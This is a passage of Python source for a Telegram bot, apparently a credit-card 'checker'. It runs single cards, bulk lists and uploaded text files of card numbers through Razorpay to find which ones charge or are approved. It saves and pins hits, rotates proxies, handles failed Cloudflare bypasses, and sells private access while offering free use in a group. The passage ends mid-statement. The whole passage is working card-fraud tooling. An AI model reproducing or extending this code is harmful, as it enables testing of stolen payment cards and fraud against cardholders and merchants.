            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙙𝙤𝙚𝙨 𝙣𝙤𝙩 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")

        success = await remove_premium_user(user_id)

        if success:
            await event.reply(f"✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}!")

            try:
                await client.send_message(user_id, f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙖𝙘𝙘𝙚𝙨𝙨 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /ban {user_id}")

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙖𝙣𝙣𝙚𝙙!")

        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)

        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!")

        try:
            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭")
        except:
            pass

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unban {user_id}")

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙣𝙤𝙩 𝙗𝙖𝙣𝙣𝙚𝙙!")

        success = await unban_user(user_id)

        if success:
            await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙪𝙣𝙗𝙖𝙣𝙣𝙚𝙙!")

            try:
                await client.send_message(user_id, f"🎉 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝙐𝙣𝙗𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥𝙨.\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙮𝙤𝙪 𝙬𝙞𝙡𝙡 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙣𝙗𝙖𝙣 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")


# --- Razorpay Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rzp(?:\s|$)'))
async def rzp(event):
    """Single card check using Razorpay"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 ⌁ 𝙍𝙚𝙫𝟯𝙧𝙨𝙚𝙭 <𝙊𝙛𝙛/𝙞𝙣𝙚>", buttons=buttons)

    asyncio.create_task(process_rzp_card(event, access_type))

async def process_rzp_card(event, access_type):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    card = None
    is_premium = await is_premium_user(event.sender_id)
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            card = extract_card(replied_msg.text)
        if not card:
            if is_premium:
                return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /𝙧𝙯𝙥 4111111111111111|12|2025|123")
    else:
        card = extract_card(event.raw_text)
        if not card:
            if is_premium:
                return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /rzp 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    async def animate_loading():
        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 5])
                await asyncio.sleep(0.5)
                i += 1
            except: 
                break

    loading_task = asyncio.create_task(animate_loading())

    try:
        res = await check_card_razorpay(card, user_id=event.sender_id)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()

        # Check for Razorpay status
        # Status field contains: "Charged" for success, or reason for declined
        is_charged = False
        if any(x in status_text for x in ["charged", "success", "captured", "authorized"]):
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif "insufficient" in status_text or "insufficient" in response_text:
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved"
            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif "cloudflare bypass failed" in response_text:
            status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"

        msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Razorpay ₹1')}
𝗥𝗲𝘀𝗽𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""

        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_charged: 
            await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrzp(?:\s|$)'))
async def mrzp(event):
    """Mass check using Razorpay from text"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)

    cards = []
    is_premium = await is_premium_user(event.sender_id)
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            cards = extract_all_cards(replied_msg.text)
        if not cards:
            if is_premium:
                return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙧𝙯𝙥 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards:
            if is_premium:
                return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /mrzp 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")

    # Apply limit based on user type (admin has no limit)
    user_limit = get_cc_limit(access_type, event.sender_id)
    if len(cards) > user_limit:
        cards = cards[:user_limit]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {user_limit} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙨𝙞𝙨 {user_limit} 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙧𝙯𝙥.```")

    asyncio.create_task(process_mrzp_cards(event, cards))

async def process_mrzp_cards(event, cards):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    # Get all user proxies for rotation
    user_proxies = await get_all_user_proxies(event.sender_id)
    proxy_index = 0

    sent_msg = await event.reply(f"```𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")

    batch_size = 5  # Reduced batch size for proxy rotation
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = []
        for card in batch:
            # Rotate proxy for each card
            if user_proxies:
                proxy_data = user_proxies[proxy_index % len(user_proxies)]
                tasks.append(check_card_razorpay_with_proxy(card, proxy_data))
                proxy_index += 1
            else:
                tasks.append(check_card_razorpay(card, user_id=event.sender_id))
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (card, result) in enumerate(zip(batch, results)):
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "Razorpay"}

            start_time = time.time()
            end_time = time.time()
            elapsed_time = round(end_time - start_time, 2)
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            response_text = result.get("Response", "").lower()
            status_text = result.get("Status", "").lower()

            # Check for Razorpay status
            is_charged = False
            if any(x in status_text for x in ["charged", "success", "captured", "authorized"]):
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_result = "Charged"
                is_charged = True
                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif "insufficient" in status_text or "insufficient" in response_text:
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                status_result = "Approved"
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif "cloudflare bypass failed" in response_text:
                status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                result["Response"] = "Cloudflare spotted 🤡 change site or try again"
            else:
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                status_result = "Declined"

            card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Razorpay ₹1')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
            result_msg = await event.reply(card_msg)
            if is_charged: 
                await pin_charged_message(event, result_msg)
            await asyncio.sleep(0.1)

    await sent_msg.edit(f"```✅ 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rztxt(?:\s|$)'))
async def rztxt(event):
    """Check CCs from a .txt file using Razorpay"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)

    user_id = event.sender_id
    if user_id in ACTIVE_RZP_PROCESSES: 
        return await event.reply("```𝙔𝙤𝙪𝙧 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝘾𝘾 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")

    try:
        if not event.reply_to_msg_id: 
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙯𝙩𝙭𝙩```")

        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: 
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙯𝙩𝙭𝙩```")

        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: 
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: 
                os.remove(file_path)
            except: 
                pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")

        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: 
            return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")

        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)

        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else: 
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")

        ACTIVE_RZP_PROCESSES[user_id] = True
        asyncio.create_task(process_rztxt_cards(event, cards))
    except Exception as e:
        ACTIVE_RZP_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_rztxt_cards(event, cards):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳```")

    # Get all user proxies for rotation
    user_proxies = await get_all_user_proxies(user_id)
    proxy_index = 0

    try:
        batch_size = 10  # Reduced batch size for proxy rotation
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i+batch_size]
            tasks = []
            for card in batch:
                # Rotate proxy for each card
                if user_proxies:
                    proxy_data = user_proxies[proxy_index % len(user_proxies)]
                    tasks.append(check_card_razorpay_with_proxy(card, proxy_data))
                    proxy_index += 1
                else:
                    tasks.append(check_card_razorpay(card, user_id=user_id))
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (card, result) in enumerate(zip(batch, results)):
                if user_id not in ACTIVE_RZP_PROCESSES: 
                    break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "Razorpay"}

                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)

                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                status_text_lower = result.get("Status", "").lower()

                # Check for Razorpay status
                if any(x in status_text_lower for x in ["charged", "success", "captured", "authorized"]):
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif "insufficient" in status_text_lower or "insufficient" in response_text_lower:
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Razorpay ₹1')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
                    result_msg = await event.reply(card_msg)
                    # Pin if charged
                    if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                        await pin_charged_message(event, result_msg)

                buttons = [
                    [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_rztxt:{user_id}".encode())]
                ]
                try: 
                    await status_msg.edit("```𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳...```", buttons=buttons)
                except: 
                    pass
                await asyncio.sleep(0.1)

        final_caption = f"""✅ 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [
            [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], 
            [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], 
            [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], 
